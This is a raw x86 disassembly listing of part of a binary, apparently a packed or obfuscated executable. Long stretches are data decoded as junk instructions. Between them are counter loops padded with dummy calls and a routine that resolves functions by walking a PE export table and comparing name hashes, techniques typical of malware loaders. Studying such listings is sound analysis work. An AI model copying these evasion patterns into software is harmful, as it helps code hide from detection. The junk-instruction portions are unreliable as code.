  41a04b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a04c:	dec    ebx
  41a04d:	in     al,0x63
  41a04f:	xchg   DWORD PTR [ebx],esp
  41a051:	jbe    0x41a078
  41a053:	xchg   edi,eax
  41a054:	sub    esp,DWORD PTR [eax+0x37]
  41a057:	ins    DWORD PTR es:[edi],dx
  41a058:	mov    bl,BYTE PTR [ebp+0x6482c3d6]
  41a05e:	dec    edx
  41a05f:	neg    DWORD PTR [esi+0x371feae5]
  41a065:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a066:	sbb    esp,0xffffffb6
  41a069:	test   DWORD PTR [edi-0x20bc5e17],ebx
  41a06f:	lds    esp,FWORD PTR [ecx]
  41a071:	neg    al
  41a073:	push   0x78
  41a075:	mov    BYTE PTR [ebx],al
  41a077:	sti    
  41a078:	out    0xcc,al
  41a07a:	test   DWORD PTR [ebp-0x5],eax
  41a07d:	push   eax
  41a07e:	popf   
  41a07f:	add    al,0xb9
  41a081:	jmp    0x886c:0xe540c9d
  41a088:	xor    DWORD PTR [ecx-0x493de4aa],edx
  41a08e:	dec    esi
  41a08f:	dec    ebx
  41a090:	and    eax,0x592e2b47
  41a095:	pop    esp
  41a096:	lea    esp,[edx-0x5ee152ca]
  41a09c:	dec    ebx
  41a09d:	stc    
  41a09e:	mov    ds:0xbedd920f,al
  41a0a3:	hlt    
  41a0a4:	pop    edx
  41a0a5:	or     BYTE PTR [esi+ebx*2-0x2b],dl
  41a0a9:	lods   al,BYTE PTR ds:[esi]
  41a0aa:	inc    esp
  41a0ab:	push   ebp
  41a0ac:	ret    0x3822
  41a0af:	xchg   ecx,eax
  41a0b0:	cld    
  41a0b1:	inc    esi
  41a0b2:	push   es
  41a0b3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a0b4:	push   0x20
  41a0b6:	adc    ch,BYTE PTR [edx-0x433c904]
  41a0bc:	imul   edx,DWORD PTR [ebx],0x8247ba18
  41a0c2:	cmp    DWORD PTR [edi+0x39],edi
  41a0c5:	xor    eax,DWORD PTR [ebp-0x80]
  41a0c8:	sub    al,0x88
  41a0ca:	outs   dx,BYTE PTR ds:[esi]
  41a0cb:	and    eax,0x6cf8a345
  41a0d0:	idiv   DWORD PTR [eax+0x3e]
  41a0d3:	sub    BYTE PTR [esi+edx*8],bl
  41a0d6:	xor    al,0x1d
  41a0d8:	cmp    DWORD PTR [esi-0x33ee060f],0x953293dd
  41a0e2:	push   esp
  41a0e3:	in     eax,0x3d
  41a0e5:	out    dx,al
  41a0e6:	div    BYTE PTR [ecx-0x60]
  41a0e9:	sub    bl,dh
  41a0eb:	pop    ss
  41a0ec:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a0ed:	scas   eax,DWORD PTR es:[edi]
  41a0ee:	dec    ebx
  41a0ef:	add    cl,ah
  41a0f1:	cmp    al,0xbf
  41a0f3:	or     dl,dl
  41a0f5:	dec    ecx
  41a0f6:	jo     0x41a16b
  41a0f8:	jp     0x41a0b3
  41a0fa:	sahf   
  41a0fb:	enter  0xd0f5,0x77
  41a0ff:	fidivr DWORD PTR [edi+0x9eb63c9]
  41a105:	jmp    0x2cd:0xb9490a58
  41a10c:	sahf   
  41a10d:	leave  
  41a10e:	dec    ebp
  41a10f:	test   al,0x9
  41a111:	sbb    esi,DWORD PTR [esp+eiz*2+0x27]
  41a115:	das    
  41a116:	shr    DWORD PTR [edx],cl
  41a118:	fwait
  41a119:	out    0xf6,al
  41a11b:	sbb    DWORD PTR [edx+edx*4],ebx
  41a11e:	jg     0x41a0d5
  41a120:	shr    BYTE PTR [ebp+0x797137b5],0xcd
  41a127:	out    dx,eax
  41a128:	and    bl,BYTE PTR [ebx+0x5a953aca]
  41a12e:	xchg   esp,eax
  41a12f:	xchg   esi,eax
  41a130:	fcomp  st(6)
  41a132:	loop   0x41a16b
  41a134:	sub    DWORD PTR [ebx],0x3a
  41a137:	or     esp,DWORD PTR [esi+esi*1+0x4f9e97b5]
  41a13e:	add    ebx,DWORD PTR [ebx-0x5f]
  41a141:	ja     0x41a17b
  41a143:	not    BYTE PTR [edx+0x6b981934]
  41a149:	dec    ebp
  41a14a:	ins    DWORD PTR es:[edi],dx
  41a14b:	loopne 0x41a186
  41a14d:	addr16 dec ecx
  41a14f:	mov    bl,0x6d
  41a151:	xor    DWORD PTR [ebp-0x2c],esp
  41a154:	call   DWORD PTR [eax+0x139584ff]
  41a15a:	push   ds
  41a15b:	cmp    al,0x5f
  41a15d:	sbb    esp,DWORD PTR [edx]
  41a15f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a160:	mov    eax,ds:0x7b66ba52
  41a165:	add    ecx,DWORD PTR [esi+0x5b05422e]
  41a16b:	inc    esp
  41a16c:	push   esi
  41a16d:	imul   eax,DWORD PTR [ecx+0x73351f21],0x7f
  41a174:	outs   dx,BYTE PTR ds:[esi]
  41a175:	in     al,0x88
  41a177:	loop   0x41a177
  41a179:	inc    eax
  41a17a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a17b:	imul   eax,ebp,0xa58aea6e
  41a181:	pop    edx
  41a182:	pusha  
  41a183:	sbb    eax,0xb163cadd
  41a188:	sti    
  41a189:	leave  
  41a18a:	or     DWORD PTR [edi+0x7d],edx
  41a18d:	repnz mov edx,0xdab380c4
  41a193:	es repz (bad) 
  41a196:	int    0x7f
  41a198:	(bad)  
  41a199:	leave  
  41a19a:	jbe    0x41a1d5
  41a19c:	add    DWORD PTR [esi],ebp
  41a19e:	js     0x41a13e
  41a1a0:	int    0xb3
  41a1a2:	mov    bl,0x68
  41a1a4:	inc    esi
  41a1a5:	pop    eax
  41a1a6:	test   al,0xe3
  41a1a8:	test   ebx,0x4e2c31ec
  41a1ae:	stos   BYTE PTR es:[edi],al
  41a1af:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a1b0:	push   eax
  41a1b1:	jecxz  0x41a1a4
  41a1b3:	inc    edx
  41a1b4:	fisttp QWORD PTR [edx-0x5055d698]
  41a1ba:	jp     0x41a148
  41a1bc:	cmp    eax,0xcdc38e43
  41a1c1:	pop    ebp
  41a1c2:	dec    ecx
  41a1c3:	fs mov dh,0xfd
  41a1c6:	(bad)  
  41a1c7:	cwde   
  41a1c8:	aas    
  41a1c9:	sbb    ch,dh
  41a1cb:	add    DWORD PTR [esi],0x30fa81b5
  41a1d1:	shld   DWORD PTR ss:[ecx],esp,0xcd
  41a1d6:	mov    ds:0x8ac805b0,eax
  41a1db:	loop   0x41a16b
  41a1dd:	(bad)  
  41a1de:	sar    BYTE PTR [eax],1
  41a1e0:	mov    bh,0x14
  41a1e2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a1e3:	xor    bl,BYTE PTR [ebp+0x33]
  41a1e6:	sar    BYTE PTR [ebx+0x39],cl
  41a1e9:	test   al,0xb0
  41a1eb:	(bad)  
  41a1ec:	mov    ds:0x1fb8ecc6,al
  41a1f1:	and    esp,DWORD PTR [ecx]
  41a1f3:	mov    esp,0x58c70350
  41a1f8:	xchg   ebx,eax
  41a1f9:	ds and al,0xfc
  41a1fd:	mov    bl,0x77
  41a1ff:	out    0x8b,al
  41a201:	inc    ebp
  41a202:	cld    
  41a203:	mov    ecx,DWORD PTR [ebp-0x20]
  41a206:	mov    DWORD PTR ds:0x42aa11,0x1c
  41a210:	cmp    DWORD PTR ds:0x42aa11,0x0
  41a217:	je     0x41a247
  41a21d:	cmp    DWORD PTR ds:0x42aa11,0x29
  41a224:	jne    0x41a233
  41a22a:	push   DWORD PTR [ebp-0xc]
  41a22d:	call   DWORD PTR ds:0x41d124
  41a233:	xor    esi,esi
  41a235:	xor    esi,DWORD PTR ds:0x42aa11
  41a23b:	dec    esi
  41a23c:	mov    DWORD PTR ds:0x42aa11,esi
  41a242:	jmp    0x41a210
  41a247:	mov    esi,0x7510850
  41a24c:	mov    DWORD PTR ds:0x42aaad,0x3f72
  41a256:	xor    eax,esi
  41a258:	add    eax,ebx
  41a25a:	cmp    ecx,eax
  41a25c:	mov    DWORD PTR ds:0x42a9cd,0x752f
  41a266:	je     0x41a678
  41a26c:	push   DWORD PTR [ebp-0x20]
  41a26f:	sub    DWORD PTR ds:0x42a9b9,0x42aaad
  41a279:	push   DWORD PTR [ebp+0x8]
  41a27c:	call   0x408a76
  41a281:	jmp    0x41a4b6
  41a286:	(bad)  
  41a287:	les    edi,FWORD PTR [edi]
  41a289:	iret   
  41a28a:	rcr    ebx,1
  41a28c:	(bad)  
  41a28d:	leave  
  41a28e:	push   edi
  41a28f:	push   edx
  41a290:	in     al,dx
  41a291:	je     0x41a2d4
  41a293:	sbb    DWORD PTR [edi+0x7fd198f1],ebx
  41a299:	js     0x41a2ab
  41a29b:	jle    0x41a315
  41a29d:	js     0x41a220
  41a29f:	int3   
  41a2a0:	push   edx
  41a2a1:	jmp    0x41a2f8
  41a2a3:	nop
  41a2a4:	in     al,dx
  41a2a5:	bound  edx,QWORD PTR [esi-0x1c4a5341]
  41a2ab:	outs   dx,DWORD PTR ds:[si]
  41a2ad:	mov    edi,0x70ce950
  41a2b2:	retf   0xcad
  41a2b5:	ja     0x41a2e0
  41a2b7:	retf   
  41a2b8:	cdq    
  41a2b9:	sub    BYTE PTR [ecx],dh
  41a2bb:	imul   esp,DWORD PTR [ebx+0x22],0x1c1161de
  41a2c2:	jge    0x41a2af
  41a2c4:	stos   BYTE PTR es:[edi],al
  41a2c5:	dec    ebp
  41a2c6:	sub    DWORD PTR [esi-0x798bff6c],eax
  41a2cc:	stc    
  41a2cd:	popf   
  41a2ce:	xchg   ebx,eax
  41a2cf:	int    0x8a
  41a2d1:	fdiv   DWORD PTR [eax]
  41a2d3:	sbb    bh,BYTE PTR [eax+0x21]
  41a2d6:	imul   eax,edi,0x68c06fdc
  41a2dc:	add    BYTE PTR [esp+eiz*8],dl
  41a2df:	sbb    al,0x5e
  41a2e1:	xor    BYTE PTR [edi-0x47646454],dh
  41a2e7:	and    al,0x28
  41a2e9:	dec    ecx
  41a2ea:	fisttp DWORD PTR ds:0x1bd77ea2
  41a2f0:	aaa    
  41a2f1:	add    ah,dl
  41a2f3:	xor    edi,DWORD PTR [ebx]
  41a2f5:	mov    dh,0xa2
  41a2f7:	cmp    al,0xdc
  41a2f9:	shl    BYTE PTR [ecx],1
  41a2fb:	cmp    eax,0x678daa64
  41a300:	aad    0xf9
  41a302:	and    esi,DWORD PTR [ebp-0x481d74f3]
  41a308:	push   ecx
  41a309:	jno    0xc3d0f80f
  41a30f:	sbb    BYTE PTR [edi],al
  41a311:	push   0x5281e3f3
  41a316:	std    
  41a317:	(bad)  
  41a318:	cmp    eax,0x2603816b
  41a31d:	sbb    edx,esp
  41a31f:	pop    edi
  41a320:	mov    eax,ds:0x912c7b32
  41a325:	add    ah,al
  41a327:	mov    BYTE PTR [ebx-0x620f231e],0xd8
  41a32e:	fstp   DWORD PTR [esi-0x3b]
  41a331:	out    dx,al
  41a332:	adc    BYTE PTR [edx],cl
  41a334:	cmp    eax,0x434e7766
  41a339:	lahf   
  41a33a:	nop
  41a33b:	pusha  
  41a33c:	out    0x2a,eax
  41a33e:	fadd   QWORD PTR [esi+0x1c]
  41a341:	pcmpeqw mm2,QWORD PTR [esi]
  41a344:	cmc    
  41a345:	(bad)  
  41a347:	pop    ss
  41a348:	dec    ecx
  41a349:	pop    ss
  41a34a:	inc    edx
  41a34b:	dec    edi
  41a34c:	mov    eax,ds:0x273711b3
  41a351:	cmp    ecx,DWORD PTR [eax]
  41a353:	xor    al,0x3
  41a355:	and    eax,DWORD PTR [eax-0xb]
  41a358:	nop
  41a359:	test   eax,0x981ec88a
  41a35e:	mov    dh,0x2c
  41a360:	and    al,0xbe
  41a362:	mov    DWORD PTR [eax+0x75ab88ba],ecx
  41a368:	jle    0x41a335
  41a36a:	retf   
  41a36b:	(bad)  
  41a36d:	inc    edi
  41a36e:	jo     0x41a33f
  41a370:	xchg   ecx,eax
  41a371:	dec    ebx
  41a372:	in     eax,dx
  41a373:	xchg   esi,eax
  41a374:	mov    al,0xfc
  41a376:	test   DWORD PTR [ebx+0x1e],edx
  41a379:	jp     0x41a35d
  41a37b:	inc    ecx
  41a37c:	pushf  
  41a37d:	mov    esi,0x6d6fe1d6
  41a382:	mov    ds:0x6c4cf5a6,eax
  41a387:	mov    dh,0xa9
  41a389:	jmp    0x41a33a
  41a38b:	ins    BYTE PTR es:[edi],dx
  41a38c:	shl    DWORD PTR [ecx],cl
  41a38e:	repz add dl,cl
  41a391:	inc    ebp
  41a392:	ss xchg edi,eax
  41a394:	inc    esi
  41a395:	mov    edi,0x220e7d6c
  41a39a:	fst    st(6)
  41a39c:	jmp    0x118f:0xb568ece2
  41a3a3:	cmp    ah,BYTE PTR [edi+eax*1]
  41a3a6:	inc    eax
  41a3a7:	mov    DWORD PTR [eax-0x7b],ebp
  41a3aa:	push   0xffffffac
  41a3ac:	xchg   ebx,eax
  41a3ad:	xchg   ebp,eax
  41a3ae:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a3af:	xlat   BYTE PTR ds:[ebx]
  41a3b0:	sbb    ebp,DWORD PTR [esi]
  41a3b2:	sbb    eax,ebp
  41a3b4:	mov    dh,0x91
  41a3b6:	jb     0x41a342
  41a3b8:	xchg   ebp,eax
  41a3b9:	cmp    DWORD PTR [ebx+0x75942017],edi
  41a3bf:	shl    BYTE PTR ds:0x1947ad94,cl
  41a3c5:	inc    eax
  41a3c6:	pushf  
  41a3c7:	inc    ebx
  41a3c8:	iret   
  41a3c9:	(bad)  
  41a3cb:	push   eax
  41a3cc:	and    eax,0x7e0d4d01
  41a3d1:	pop    esi
  41a3d2:	(bad)  
  41a3d3:	cdq    
  41a3d4:	pusha  
  41a3d5:	dec    ebx
  41a3d6:	inc    esp
  41a3d7:	fiadd  WORD PTR [ebx]
  41a3d9:	sub    eax,0x400466ab
  41a3de:	mov    bh,0xd7
  41a3e0:	sbb    bl,dh
  41a3e2:	or     ebp,edi
  41a3e4:	jno    0x41a36e
  41a3e6:	xchg   esp,eax
  41a3e7:	push   cs
  41a3e8:	mov    dh,0xee
  41a3ea:	ja     0x41a392
  41a3ec:	jae    0x41a42f
  41a3ee:	xor    eax,DWORD PTR [eax]
  41a3f0:	or     ecx,esp
  41a3f2:	or     ecx,ebx
  41a3f4:	push   eax
  41a3f5:	or     edx,esi
  41a3f7:	pop    esp
  41a3f8:	mov    cl,0xc2
  41a3fa:	cmp    eax,0x8d40cec9
  41a3ff:	jecxz  0x41a38f
  41a401:	fcomp  QWORD PTR [ebx+0x4d528ca5]
  41a407:	ss add eax,0x45
  41a40b:	dec    DWORD PTR [edi]
  41a40d:	or     DWORD PTR [esi-0x43],0xf3fb49ee
  41a414:	in     al,dx
  41a415:	jp     0x41a409
  41a417:	fs lock out dx,al
  41a41a:	aas    
  41a41b:	popf   
  41a41c:	xor    BYTE PTR [ebp+edi*2+0x73740f42],dh
  41a423:	mov    cs,ecx
  41a425:	jle    0x41a3f8
  41a427:	or     dl,BYTE PTR [edi+ebx*4]
  41a42a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a42b:	pop    ss
  41a42c:	inc    si
  41a42e:	cli    
  41a42f:	cmp    BYTE PTR [ecx+edx*2-0x50],bh
  41a433:	sub    BYTE PTR [edx+0x64],al
  41a436:	dec    ecx
  41a437:	jl     0x41a3ed
  41a439:	arpl   si,si
  41a43b:	(bad)  [edi+0x4d]
  41a43e:	xor    esp,esi
  41a440:	in     al,dx
  41a441:	cmc    
  41a442:	xchg   esp,eax
  41a443:	xor    al,0x1
  41a445:	das    
  41a446:	outs   dx,DWORD PTR ds:[esi]
  41a447:	dec    ecx
  41a448:	imul   ebp,eax,0x55a220bd
  41a44e:	popf   
  41a44f:	fs (bad) 
  41a451:	ds stos DWORD PTR es:[edi],eax
  41a453:	(bad)  
  41a454:	fsub   QWORD PTR [edi+0x1f0a969a]
  41a45a:	call   FWORD PTR ds:0x1c67c434
  41a460:	inc    edx
  41a461:	cmp    esi,DWORD PTR [edi+0x67fe0fc4]
  41a467:	stos   DWORD PTR es:[edi],eax
  41a468:	add    bl,bh
  41a46a:	sbb    BYTE PTR [eax],al
  41a46c:	inc    ecx
  41a46d:	fs jmp ebp
  41a470:	xor    al,0x62
  41a472:	and    ecx,edi
  41a474:	cmc    
  41a475:	sbb    bh,BYTE PTR [edx-0x3b]
  41a478:	jno    0x41a419
  41a47a:	mov    eax,ds:0xafe703df
  41a47f:	pop    eax
  41a480:	in     al,dx
  41a481:	in     al,dx
  41a482:	fs mov bl,0x42
  41a485:	xchg   ebx,eax
  41a486:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a487:	xor    DWORD PTR [edx-0x77],edi
  41a48a:	jb     0x41a479
  41a48c:	mov    esi,0x7df8cdf0
  41a491:	shl    DWORD PTR [ecx-0x23],cl
  41a494:	adc    ah,BYTE PTR [ecx+0x1177ee3f]
  41a49a:	mov    ah,0xad
  41a49c:	jle    0x41a44d
  41a49e:	sbb    DWORD PTR [ebp-0x8db5ae8],ecx
  41a4a4:	jecxz  0x41a4ea
  41a4a6:	pushf  
  41a4a7:	xchg   ebx,eax
  41a4a8:	mov    WORD PTR [esi+0x20],fs
  41a4ab:	aam    0x2f
  41a4ad:	js     0x41a474
  41a4af:	mov    edx,DWORD PTR [ebp+0x31]
  41a4b2:	shl    DWORD PTR [edi],0x41
  41a4b5:	mov    esp,0xc7ec4589
  41a4ba:	add    eax,0x42a9bd
  41a4bf:	sbb    BYTE PTR [eax],al
  41a4c1:	add    BYTE PTR [eax],al
  41a4c3:	cmp    DWORD PTR ds:0x42a9bd,0x0
  41a4ca:	je     0x41a5f6
  41a4d0:	cmp    DWORD PTR ds:0x42a9bd,0x1a
  41a4d7:	jne    0x41a4e8
  41a4dd:	push   0x3f0b
  41a4e2:	call   DWORD PTR ds:0x41d200
  41a4e8:	mov    eax,ds:0x42a9bd
  41a4ed:	dec    eax
  41a4ee:	mov    ds:0x42a9bd,eax
  41a4f3:	jmp    0x41a4c3
  41a4f8:	and    DWORD PTR ds:0x42aa51,0x0
  41a502:	jmp    0x41a512
  41a507:	mov    eax,ds:0x42aa51
  41a50c:	inc    eax
  41a50d:	mov    ds:0x42aa51,eax
  41a512:	cmp    DWORD PTR ds:0x42aa51,0x1f
  41a519:	jae    0x41a5f6
  41a51f:	cmp    DWORD PTR ds:0x42aa51,0x8
  41a526:	jne    0x41a53f
  41a52c:	push   0x8add
  41a531:	push   0x6acd
  41a536:	push   DWORD PTR [ebp-0x20]
  41a539:	call   DWORD PTR ds:0x41d128
  41a53f:	cmp    DWORD PTR ds:0x42aa51,0x7
  41a546:	jne    0x41a557
  41a54c:	mov    eax,ds:0x42aa51
  41a551:	inc    eax
  41a552:	mov    ds:0x42aa51,eax
  41a557:	jmp    0x41a507
  41a55c:	mov    DWORD PTR ds:0x42a9dd,0x11
  41a566:	cmp    DWORD PTR ds:0x42a9dd,0x0
  41a56d:	je     0x41a5f6
  41a573:	cmp    DWORD PTR ds:0x42a9dd,0x1d
  41a57a:	jne    0x41a58b
  41a580:	push   0x75df
  41a585:	call   DWORD PTR ds:0x41d12c
  41a58b:	mov    eax,ds:0x42a9dd
  41a590:	dec    eax
  41a591:	mov    ds:0x42a9dd,eax
  41a596:	jmp    0x41a566
  41a59b:	and    DWORD PTR ds:0x42a9b9,0x0
  41a5a5:	mov    ecx,DWORD PTR ds:0x42a9b9
  41a5ab:	inc    ecx
  41a5ac:	mov    DWORD PTR ds:0x42a9b9,ecx
  41a5b2:	cmp    DWORD PTR ds:0x42a9b9,0xb
  41a5b9:	jne    0x41a5cd
  41a5bf:	push   DWORD PTR [ebp-0x28]
  41a5c2:	push   0x2f79
  41a5c7:	call   DWORD PTR ds:0x41d204
  41a5cd:	cmp    DWORD PTR ds:0x42a9b9,0xa
  41a5d4:	jne    0x41a5e9
  41a5da:	xor    ecx,ecx
  41a5dc:	add    ecx,DWORD PTR ds:0x42a9b9
  41a5e2:	inc    ecx
  41a5e3:	mov    DWORD PTR ds:0x42a9b9,ecx
  41a5e9:	cmp    DWORD PTR ds:0x42a9b9,0x15
  41a5f0:	jb     0x41a5a5
  41a5f6:	mov    eax,DWORD PTR [ebp-0x4]
  41a5f9:	mov    ecx,DWORD PTR [ebp-0x14]
  41a5fc:	xor    eax,esi
  41a5fe:	add    eax,ebx
  41a600:	cmp    ecx,eax
  41a602:	je     0x41a678
  41a608:	mov    eax,DWORD PTR [ebp-0x14]
  41a60b:	mov    eax,DWORD PTR [eax+0x18]
  41a60e:	mov    DWORD PTR [ebp-0x20],eax
  41a611:	mov    eax,DWORD PTR [ebp-0x14]
  41a614:	mov    ecx,DWORD PTR [ebp+0x8]
  41a617:	add    ecx,DWORD PTR [eax+0x20]
  41a61a:	mov    DWORD PTR [ebp-0x28],ecx
  41a61d:	mov    eax,DWORD PTR [ebp-0x14]
  41a620:	mov    ecx,DWORD PTR [ebp+0x8]
  41a623:	add    ecx,DWORD PTR [eax+0x24]
  41a626:	mov    DWORD PTR [ebp-0x2c],ecx
  41a629:	mov    eax,DWORD PTR [ebp-0x14]
  41a62c:	mov    ecx,DWORD PTR [ebp+0x8]
  41a62f:	add    ecx,DWORD PTR [eax+0x1c]
  41a632:	xor    esi,esi
  41a634:	mov    DWORD PTR [ebp-0x14],ecx
  41a637:	mov    eax,DWORD PTR [ebp-0x28]
  41a63a:	mov    ecx,DWORD PTR [ebp+0x8]
  41a63d:	add    ecx,DWORD PTR [eax+edi*4]
  41a640:	lea    eax,[ebp-0x8]
  41a643:	mov    DWORD PTR [ebp-0x30],ecx
  41a646:	push   eax
  41a647:	push   DWORD PTR [ebp-0x30]
  41a64a:	push   DWORD PTR [ebp+0xc]
  41a64d:	call   0x4068d8
  41a652:	mov    eax,DWORD PTR [ebp-0x4]
  41a655:	mov    ecx,DWORD PTR [ebp-0x8]
  41a658:	xor    eax,0x7510850
  41a65d:	add    eax,ebx
  41a65f:	cmp    ecx,eax
  41a661:	jne    0x41a8b9
  41a667:	mov    eax,DWORD PTR [ebp-0x20]
  41a66a:	inc    edi
  41a66b:	cmp    edi,eax
  41a66d:	jb     0x419d40
  41a673:	jmp    0x41a8c9
  41a678:	mov    eax,DWORD PTR [ebp-0x4]
  41a67b:	xor    eax,esi
  41a67d:	jmp    0x41a8b2
  41a682:	retf   0xccc3
  41a685:	cmp    al,0xd9
  41a687:	rcr    edx,cl
  41a689:	leave  
  41a68a:	mov    esp,gs
  41a68c:	and    al,0x1
  41a68e:	add    al,0xa8
  41a690:	out    0xe2,al
  41a692:	mov    al,0xd7
  41a694:	jg     0x41a70e
  41a696:	adc    BYTE PTR [esi+0x78],bh
  41a699:	js     0x41a64b
  41a69b:	sub    ebp,edi
  41a69d:	xchg   DWORD PTR [edx+ecx*1],eax
  41a6a0:	dec    edi
  41a6a1:	aad    0xe2
  41a6a3:	enter  0xc7e2,0xa5
  41a6a7:	call   0xe499058c
  41a6ac:	dec    eax
  41a6ad:	jo     0x41a6b4
  41a6af:	pop    edx
  41a6b0:	or     BYTE PTR [ecx],ch
  41a6b2:	pop    ebp
  41a6b3:	test   BYTE PTR ss:[ebp-0x7bcc1af7],bh
  41a6ba:	and    bl,BYTE PTR [ecx]
  41a6bc:	add    al,0x4d
  41a6be:	les    eax,FWORD PTR [ebp-0x72c0c22b]
  41a6c4:	mov    bh,BYTE PTR [esp+esi*4]
  41a6c7:	pop    ss
  41a6c8:	push   DWORD PTR [eax]
  41a6ca:	in     al,dx
  41a6cb:	mov    esp,0x4b69d800
  41a6d0:	cmc    
  41a6d1:	xchg   ebx,eax
  41a6d2:	je     0x41a6e7
  41a6d4:	pop    ebx
  41a6d5:	xchg   ebp,eax
  41a6d6:	push   ss
  41a6d7:	xchg   ecx,eax
  41a6d8:	inc    ebx
  41a6d9:	xchg   esp,eax
  41a6da:	ins    BYTE PTR es:[edi],dx
  41a6db:	jmp    0x41a702
  41a6dd:	retf   0x53a7
  41a6e0:	std    
  41a6e1:	dec    ebp
  41a6e2:	pop    eax
  41a6e3:	in     eax,0x27
  41a6e5:	xor    eax,0xbe1b71c4
  41a6ea:	or     ebp,DWORD PTR [ebp+eiz*8-0x2c2c0c04]
  41a6f1:	(bad)  
  41a6f2:	jmp    0x48e4d51e
  41a6f7:	and    esi,esi
  41a6f9:	xor    edi,DWORD PTR ds:0xbe8be75c
  41a6ff:	shr    DWORD PTR [edx-0x5cbbd3a7],0x44
  41a706:	mov    ch,0x2f
  41a708:	inc    edi
  41a709:	icebp  
  41a70a:	lods   eax,DWORD PTR ds:[esi]
  41a70b:	les    ebp,FWORD PTR [eax+0x242ea221]
  41a711:	fst    DWORD PTR [ebp+0x71]
  41a714:	cmp    ch,dl
  41a716:	mov    edi,0x95a25418
  41a71b:	pxor   mm0,QWORD PTR [ecx-0x3e]
  41a71f:	jge    0x41a750
  41a721:	jmp    0xaf95:0xeefb6ce2
  41a728:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a729:	fcomp  DWORD PTR [eiz*4-0x286be30f]
  41a730:	dec    esi
  41a731:	or     eax,edi
  41a733:	jne    0x41a6da
  41a735:	and    al,0xd
  41a737:	clc    
  41a738:	or     eax,eax
  41a73a:	dec    ebp
  41a73b:	xchg   esi,eax
  41a73c:	(bad)  
  41a73d:	push   esp
  41a73e:	in     eax,0x7c
  41a740:	outs   dx,BYTE PTR ds:[esi]
  41a741:	out    dx,al
  41a742:	jb     0x41a7bf
  41a744:	or     DWORD PTR [esi+0x28dc715e],edx
  41a74a:	or     BYTE PTR [ebp-0x29],0x55
  41a74e:	sub    eax,0xe156ed66
  41a753:	int3   
  41a754:	jecxz  0x41a729
  41a756:	or     edx,ecx
  41a758:	dec    ebp
  41a759:	mov    ch,0x11
  41a75b:	and    al,cl
  41a75d:	out    0x93,eax
  41a75f:	mov    al,0x1a
  41a761:	mov    eax,ds:0xbf25d1e8
  41a766:	ins    DWORD PTR es:[edi],dx
  41a767:	loop   0x41a7c2
  41a769:	xor    edi,DWORD PTR [ecx-0x17]
  41a76c:	jle    0x41a714
  41a76e:	mov    eax,ds:0x45eec9f6
  41a773:	les    esp,FWORD PTR [eax-0x7d89d1]
  41a779:	jmp    0xba0e:0xd478ce20
  41a780:	mov    ebx,0x8a7e1943
  41a785:	dec    edi
  41a786:	popa   
  41a787:	movsx  edx,WORD PTR [ebp+0x66]
  41a78b:	popf   
  41a78c:	jge    0x41a7df
  41a78e:	push   esp
  41a78f:	pop    ebp
  41a790:	pop    edi
  41a791:	xchg   ecx,eax
  41a792:	imul   edx,eax,0x7f
  41a795:	into   
  41a796:	sub    dh,0x45
  41a799:	pop    esi
  41a79a:	cmp    bl,BYTE PTR [esp+ecx*1+0x33]
  41a79e:	bound  eax,QWORD PTR [bp+0x1]
  41a7a2:	mov    BYTE PTR [edx+0x4acae480],0x94
  41a7a9:	mov    ecx,0x28b8e6b3
  41a7ae:	hlt    
  41a7af:	shr    BYTE PTR [ebp+0x37],1
  41a7b2:	(bad)
  41a7b6:	imul   eax,edi,0xba041b60
  41a7bc:	jo     0x41a7fd
  41a7be:	out    dx,al
  41a7bf:	cwde   
  41a7c0:	hlt    
  41a7c1:	mov    ah,0xb5
  41a7c3:	sbb    BYTE PTR [edi+0x10],dh
  41a7c6:	mov    DWORD PTR [ebx-0x18b5f8b5],ecx
  41a7cc:	repnz fimul WORD PTR [edi]
  41a7cf:	es jns 0x41a7b0
  41a7d2:	xchg   edi,eax
  41a7d3:	xchg   DWORD PTR [ebx],edx
  41a7d5:	hlt    
  41a7d6:	push   ecx
  41a7d7:	test   BYTE PTR [ebx],dh
  41a7d9:	pushf  
  41a7da:	cmp    eax,DWORD PTR cs:[esi+0x4e]
  41a7de:	test   al,0x35
  41a7e0:	dec    edi
  41a7e1:	mov    dh,0xcd
  41a7e3:	aad    0x0
  41a7e5:	icebp  
  41a7e6:	nop
  41a7e7:	outs   dx,BYTE PTR ds:[esi]
  41a7e8:	sub    eax,0xf47a7a95
  41a7ed:	xor    BYTE PTR [ebp+0x33d8dad0],0xcb
  41a7f4:	cmp    BYTE PTR [edx],bh
  41a7f6:	pushf  
  41a7f7:	hlt    
  41a7f8:	sub    eax,DWORD PTR [eax+0x752332b3]
  41a7fe:	adc    ecx,edi
  41a800:	shl    BYTE PTR ds:0xfb2bcbc8,1
  41a806:	pop    esp
  41a807:	dec    edx
  41a808:	inc    edx
  41a809:	cmp    dl,BYTE PTR [eax]
  41a80b:	adc    ah,BYTE PTR [ebx-0x10]
  41a80e:	js     0x41a7fd
  41a810:	and    eax,0xee0fcebd
  41a815:	jp     0x41a7dd
  41a817:	xchg   esp,eax
  41a818:	mov    edi,0x51342b3e
  41a81d:	cmp    DWORD PTR cs:[eax],0x61e51101
  41a824:	mov    fs,esp
  41a826:	mov    DWORD PTR [ebx-0x75],ebp
  41a829:	pusha  
  41a82a:	outs   dx,BYTE PTR ds:[esi]
  41a82b:	dec    edi
  41a82c:	loopne 0x41a8a6
  41a82e:	sti    
  41a82f:	sub    eax,0xa4325a84
  41a834:	pop    es
  41a835:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a836:	in     al,dx
  41a837:	dec    ebp
  41a838:	lahf   
  41a839:	xor    al,0x66
  41a83b:	add    BYTE PTR [ebp+0x2e],0x68
  41a83f:	or     eax,0xc289c029
  41a844:	aas    
  41a845:	lahf   
  41a846:	or     edx,DWORD PTR [ebx-0x4f01bc80]
  41a84c:	pop    ecx
  41a84d:	js     0x41a7ed
  41a84f:	dec    esp
  41a850:	sti    
  41a851:	cmc    
